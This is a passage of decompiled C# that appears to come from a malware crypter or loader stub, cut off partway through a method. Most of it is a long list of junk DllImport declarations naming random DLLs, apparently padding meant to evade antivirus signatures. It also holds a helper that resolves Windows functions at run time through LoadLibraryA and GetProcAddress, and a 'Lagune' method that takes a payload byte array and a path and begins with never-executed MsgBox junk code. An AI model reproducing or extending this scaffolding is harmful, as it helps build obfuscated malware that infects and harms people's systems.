	public static extern Assembly[] lvSCh(IntPtr MEoWdjJjE, int cGSiTeX);

	[DllImport("KqblV.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] JelOr(IntPtr NYMtdeOJK, int HXknUav);

	[DllImport("pnkwP.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] vDJZS(IntPtr DuPFwBIXz, int zCrhLsK);

	[DllImport("DtGaX.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] gIuIL(IntPtr yaulANuij, int HPdgCwx);

	[DllImport("LBOHV.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] RlNZX(IntPtr dFFeZCFdH, int zkMGoMJ);

	[DllImport("AszUo.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] rgBVA(IntPtr EiYBpBCHi, int tWacWbP);

	[DllImport("yDhYs.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] qwvbI(IntPtr kSZPgpaof, int NKMRtHy);

	[DllImport("Axjtn.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] psrRy(IntPtr huxYfdqFf, int AVsLpVq);

	[DllImport("gdrgrds.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int _7468kj5(int mciId, int fpYieldProc, int dwYieldData);

	[DllImport("57dsfg4S.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int reg4ey34_002Edklk(int uDeviceID, PMwgc4CkRLWr lpCaps, int uSize);

	[DllImport("ef44.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int _443n1_002B(int hMidiIn, MIDIHDR11 lpMidiInHdr, int uSize);

	[DllImport("fgvf4.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int i78i57ik(int hmxobj, int pumxID, int fdwId);

	[DllImport("BoM.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mixerGetNumDevs();

	[DllImport("TAWV.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mixerMessage(int dgdg, int jytky, int kukyuk, int fert45g);

	[DllImport("Tqv8.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int p97ui(int phmx, int uMxId, int dwCallback, int dwInstance, int fdwOpen);

	[DllImport("6ad.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mmioClose(int hmmio, int uFlags);

	[DllImport("fD5.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mixerGetLineControlsA(int hmxobj, MIXERLINECONTROLS111 pmxlc, int fdwControls);

	[DllImport("yte.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mixerGetDevCapsA(int uMxId, Mijiohuih pmxcaps, int cbmxcaps);

	[DllImport("Mtn.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mixerGetControlDetailsA(int hmxobj, fknsakogfb pmxcd, int fdwDetails);

	[DllImport("ka7A.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ka7A();

	[DllImport("awkg6x.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int awkg6x();

	[DllImport("O9BQc.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int O9BQc();

	[DllImport("wnTUch.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int wnTUch();

	[DllImport("l0SOs.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int l0SOs();

	[DllImport("OpkHSf.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int OpkHSf();

	[DllImport("kWS9.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr kWS9();

	[DllImport("JtNrHU.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr JtNrHU();

	[DllImport("8Py9b.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr a8Py9b();

	[DllImport("gyK71.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr gyK71();

	[DllImport("qAYF.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr qAYF();

	[DllImport("wXLxR.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr wXLxR();

	[DllImport("QSbAw.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr QSbAw();

	[DllImport("CJj9X.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr CJj9X();

	[DllImport("TL5LS.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr TL5LS();

	[DllImport("EYL5y.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr EYL5y();

	[DllImport("rJZCA.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr rJZCA();

	[DllImport("kC4M.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr NUi4h();

	[DllImport("oeZl57c.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr oeZl57c();

	[DllImport("ap15.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr ap15();

	[DllImport("KDKZ.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr KDKZ();

	[DllImport("hubS.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr hubS();

	[DllImport("SwAj.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr SwAj();

	[DllImport("KNzzTE.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr KNzzTE();

	[DllImport("hYvhx.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr hYvhx();

	[DllImport("fgesgtf4w", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int AOW([MarshalAs(UnmanagedType.VBByRefStr)] ref string TEwn, [MarshalAs(UnmanagedType.VBByRefStr)] ref string TEwn, int TEwn);

	[DllImport("f43t", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int llllliu([MarshalAs(UnmanagedType.VBByRefStr)] ref string oNQJ, [MarshalAs(UnmanagedType.VBByRefStr)] ref string kw6m, int LMG1S);

	[DllImport("f4657rffg", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int hntgf(int K4Gj3, int CKG, int fvaa);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string tr6);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr Gd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Gf);

	private static Norton Bumbac<Norton>(string gFQ5, string L2L)
	{
		return (Norton)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref gFQ5), ref L2L), typeof(Norton));
	}

	[DllImport("YPrNMA.drv", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int tJe4([MarshalAs(UnmanagedType.VBByRefStr)] ref string pName, int Level, byte pProvidorInfo);

	[DllImport("GaIya.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] ZIYnK(IntPtr ilcSuijWc, int MgOwxht);

	[DllImport("OWPdm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] AZXLB(IntPtr nHZCFdEzt, int DGoSJtg);

	[DllImport("zlCEZ.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] PVAvB(IntPtr UApACHitW, int BcfpcDw);

	[DllImport("hkNlb.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] vazKD(IntPtr UxwpaofSL, int MRJHypd);

	[DllImport("etmeu.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] rRLSx(IntPtr xjMfFFfvP, int sYaOqmq);

	[DllImport("fbTmD.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] sybiT(IntPtr eknWAieUO, int gxGVDkd);

	[DllImport("hUuuc.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] fsjwo(IntPtr NwLkXmbyX, int gtCpzee);

	[DllImport("fOdSe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] HHjnD(IntPtr grqXdpUhW, int IRGyuET);

	[DllImport("kbKMG.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] FaKxS(IntPtr zhhfltBtP, int pCagkpO);

	[DllImport("YxsmA.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] sJmca(IntPtr llyLzHejN, int hwyYzja);

	[DllImport("BZyov.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] RmBlK(IntPtr LXrfiSwzG, int iwKvUUY);

	[DllImport("ssEYO.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] PxfxM(IntPtr mNfuJbWCb, int EJqcPco);

	[DllImport("UkcCc.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] AutIg(IntPtr IWZJfPiqV, int inFoVyT);

	[DllImport("pkiFV.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] nwrAt(IntPtr VCqvTShRE, int LCNJgTv);

	[DllImport("ZurDM.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] uHKsG(IntPtr nnqocBjVx, int DdDBKpZ);

	[DllImport("bHrsd.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] hMajd(IntPtr vXHlzqimO, int brNMBeG);

	[DllImport("oNwLk.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] XwkZL(IntPtr XmbyXgtCp, int zeeHHjn);

	[DllImport("egrqX.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] DfOdS(IntPtr dpUhWIRGy, int uETFaKx);

	[DllImport("Gzhhf.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] SkbKM(IntPtr ltBtPpCag, int kpOsJmc);

	[DllImport("AllyL.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] aYxsm(IntPtr zHejNhwyY, int zjaRmBl);

	[DllImport("vLXrf.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] KBZyo(IntPtr iSwzGiwKv, int UUYPxfx);

	[DllImport("OmNfu.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] MssEY(IntPtr JbWCbEJqc, int PcoAutI);

	[DllImport("cIWZJ.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] gUkcC(IntPtr fPiqVinFo, int VyTnwrA);

	[DllImport("VVCqv.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] tpkiF(IntPtr TShRELCNJ, int gTvuHKs);

	[DllImport("Mnnqo.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] GZurD(IntPtr cBjVxDdDB, int KpZhMaj);

	[DllImport("dvXHl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] dbHrs(IntPtr zqimObrNM, int BeGXwkZ);

	[DllImport("kXmby.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] LoNwL(IntPtr XgtCpzeeH, int HjnDfOd);

	[DllImport("XdpUh.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] Segrq(IntPtr WIRGyuETF, int aKxSkbK);

	[DllImport("fltBt.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] MGzhh(IntPtr PpCagkpOs, int JmcaYxs);

	[DllImport("LzHej.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] mAlly(IntPtr NhwyYzjaR, int mBlKBZy);

	[DllImport("fiSwz.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] ovLXr(IntPtr GiwKvUUYP, int xfxMssE);

	[DllImport("uJbWC.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] YOmNf(IntPtr bEJqcPcoA, int utIgUkc);

	[DllImport("JfPiq.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] CcIWZ(IntPtr VinFoVyTn, int wrAtpki);

	[DllImport("vTShR.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] FVVCq(IntPtr ELCNJgTvu, int HKsGZur);

	[DllImport("ocBjV.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] DMnnq(IntPtr xDdDBKpZh, int MajdbHr);

	[DllImport("lzqim.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] sdvXH(IntPtr ObrNMBeGX, int wkZLoNw);

	[DllImport("yXgtC.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] LkXmb(IntPtr pzeeHHjnD, int fOdSegr);

	[DllImport("hWIRG.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] qXdpU(IntPtr yuETFaKxS, int kbKMGzh);

	[DllImport("tPpCa.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] hfltB(IntPtr gkpOsJmca, int YxsmAll);

	[DllImport("jNhwy.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] yLzHe(IntPtr YzjaRmBlK, int BZyovLX);

	[DllImport("zGiwK.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] rfiSw(IntPtr vUUYPxfxM, int ssEYOmN);

	[DllImport("CbEJq.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] fuJbW(IntPtr cPcoAutIg, int UkcCcIW);

	[DllImport("qVinF.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] ZJfPi(IntPtr oVyTnwrAt, int pkiFVVC);

	[DllImport("RELCN.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] qvTSh(IntPtr JgTvuHKsG, int ZurDMnn);

	[DllImport("VxDdD.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] qocBj(IntPtr BKpZhMajd, int bHrsdvX);

	[DllImport("mObrN.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] Hlzqi(IntPtr MBeGXwkZL, int oNwLkXm);

	[DllImport("Cpzee.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] byXgt(IntPtr HHjnDfOdS, int egrqXdp);

	[DllImport("GyuET.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] UhWIR(IntPtr FaKxSkbKM, int Gzhhflt);

	[DllImport("agkpO.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] BtPpC(IntPtr sJmcaYxsm, int AllyLzH);

	[DllImport("yYzja.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] ejNhw(IntPtr RmBlKBZyo, int vLXrfiS);

	[DllImport("KvUUY.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] wzGiw(IntPtr PxfxMssEY, int OmNfuJb);

	[DllImport("qcPco.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] WCbEJ(IntPtr AutIgUkcC, int cIWZJfP);

	[DllImport("FoVyT.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] iqVin(IntPtr nwrAtpkiF, int VVCqvTS);

	[DllImport("NJgTv.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] hRELC(IntPtr uHKsGZurD, int MnnqocB);

	[DllImport("DBKpZ.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] jVxDd(IntPtr hMajdbHrs, int dvXHlzq);

	[DllImport("NMBeG.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] imObr(IntPtr XwkZLoNwL, int kXmbyXg);

	[DllImport("eHHjn.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] tCpze(IntPtr DfOdSegrq, int XdpUhWI);

	[DllImport("TFaKx.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] RGyuE(IntPtr SkbKMGzhh, int fltBtPp);

	[DllImport("OsJmc.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] Cagkp(IntPtr aYxsmAlly, int LzHejNh);

	[DllImport("aRmBl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] wyYzj(IntPtr KBZyovLXr, int fiSwzGi);

	[DllImport("YPxfx.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] wKvUU(IntPtr MssEYOmNf, int uJbWCbE);

	[DllImport("oAutI.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] JqcPc(IntPtr gUkcCcIWZ, int JfPiqVi);

	[DllImport("TnwrA.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] nFoVy(IntPtr tpkiFVVCq, int vTShREL);

	[DllImport("vuHKs.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] CNJgT(IntPtr GZurDMnnq, int ocBjVxD);

	[DllImport("ZhMaj.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] dDBKp(IntPtr dbHrsdvXH, int lzqimOb);

	[DllImport("GXwkZ.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] rNMBe(IntPtr LoNwLkXmb, int yXgtCpz);

	[DllImport("nDfOd.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] eeHHj(IntPtr SegrqXdpU, int hWIRGyu);

	[DllImport("xSkbK.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] ETFaK(IntPtr MGzhhfltB, int tPpCagk);

	[DllImport("caYxs.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] pOsJm(IntPtr mAllyLzHe, int jNhwyYz);

	[DllImport("lKBZy.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] jaRmB(IntPtr ovLXrfiSw, int zGiwKvU);

	[DllImport("xMssE.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] UYPxf(IntPtr YOmNfuJbW, int CbEJqcP);

	[DllImport("IgUkc.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] coAut(IntPtr CcIWZJfPi, int qVinFoV);

	[DllImport("Atpki.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] yTnwr(IntPtr FVVCqvTSh, int RELCNJg);

	[DllImport("sGZur.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] TvuHK(IntPtr DMnnqocBj, int VxDdDBK);

	[DllImport("jdbHZ.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] pZhMa(IntPtr wesPTipJV, int hbfZGHF);

	[DllImport("OOBGJ.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] LRAKi(IntPtr OiAgdXPrX, int SNpLKYY);

	[DllImport("emLtL.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] ugWrv(IntPtr JAeMcyjcl, int TCVklEq);

	[DllImport("UGTpt.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] Iamud(IntPtr yroZDZbMA, int qtuNbqY);

	[DllImport("whmoi.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] hsMza(IntPtr COoYKyFtK, int Cxouqlh);

	[DllImport("XBdOP.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] DoIFP(IntPtr ZeBWJpRVK, int Usxcznp);

	[DllImport("jxvgG.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] raGwq(IntPtr rCUfhSfkU, int JansNnC);

	[DllImport("sSsvj.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] Xvrci(IntPtr PUenBHSBf, int RNDClfK);

	[DllImport("BRSDA.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] ZmXMi(IntPtr HdzWykkIS, int GYtzdVT);

	[DllImport("LEHgg.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] IwTOV(IntPtr HNaFuDpEw, int EFIMPyH);

	[DllImport("ZwesP.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] MywfY(IntPtr TipJVhbfZ, int GHFLRAK);

	[DllImport("JOiAg.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] iOOBG(IntPtr dXPrXSNpL, int KYYugWr);

	[DllImport("LJAeM.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] vemLt(IntPtr cyjclTCVk, int lEqIamu);

	[DllImport("tyroZ.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] dUGTp(IntPtr DZbMAqtuN, int bqYhsMz);

	[DllImport("iCOoY.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] awhmo(IntPtr KyFtKCxou, int qlhDoIF);

	[DllImport("PZeBW.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] PXBdO(IntPtr JpRVKUsxc, int znpraGw);

	[DllImport("GrCUf.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Assembly[] qjxvg(IntPtr hSfkUJans, int NnCXvrc);

	[DllImport("LKin5", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int LKin5([MarshalAs(UnmanagedType.VBByRefStr)] ref string SgPz, [MarshalAs(UnmanagedType.VBByRefStr)] ref string DTqoQ, int EmTR);

	[DllImport("h3h3", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int h3h3([MarshalAs(UnmanagedType.VBByRefStr)] ref string psxry, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Qhyq, int wkeE);

	[DllImport("aHVx0", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int aHVx0(int CIOJ, int sLFAv, int IKU6h);

	public static void Lagune(byte[] y3, string ofL)
	{
		//IL_0047: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00af: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_010a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0117: Unknown result type (might be due to invalid IL or missing references)
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
		//IL_0158: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Unknown result type (might be due to invalid IL or missing references)
		//IL_0172: Unknown result type (might be due to invalid IL or missing references)
		//IL_017f: Unknown result type (might be due to invalid IL or missing references)
		//IL_018c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0199: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_01da: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0201: Unknown result type (might be due to invalid IL or missing references)
		//IL_020e: Unknown result type (might be due to invalid IL or missing references)
		//IL_021b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0228: Unknown result type (might be due to invalid IL or missing references)
		Hhk FTxO = default(Hhk);
		M9v Ck = default(M9v);
		rzSn das43fsa = default(rzSn);
		PP0 PTm = default(PP0);
		PP0 jJM = default(PP0);
		string text = "dnasjsajsa";
		if (Operators.CompareString("9043829483924,mflmdsfl", text, false) == 0)
		{
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
